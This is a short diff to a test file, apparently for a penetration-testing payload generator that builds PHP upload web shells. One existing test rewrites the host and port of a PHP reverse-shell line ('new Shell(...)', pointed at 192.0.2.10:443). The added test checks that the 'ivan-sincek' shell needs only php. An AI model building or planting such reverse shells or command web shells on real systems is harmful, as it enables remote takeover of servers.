@@ -61,6 +61,10 @@ describe("UPLOAD_SHELLS", () => {
     expect(sed("$sh = new Shell('127.0.0.1', 9000);", "new Shell\\([^)]*\\)", "new Shell('192.0.2.10', 443)")).toBe("$sh = new Shell('192.0.2.10', 443);");
   });
 
+  it("ivan-sincek requires php only (curl runs on Kali)", () => {
+    expect(def("upload-php-ivan-sincek").requires).toEqual(["php"]);
+  });
+
   it("trigger joins the upload path with single slashes", () => {
     const d = def("upload-php-cmd");
     const t = (p: string) => buildPayload(d, "uploaded-file", { ...V, UPLOAD_PATH: p }).trigger?.text;
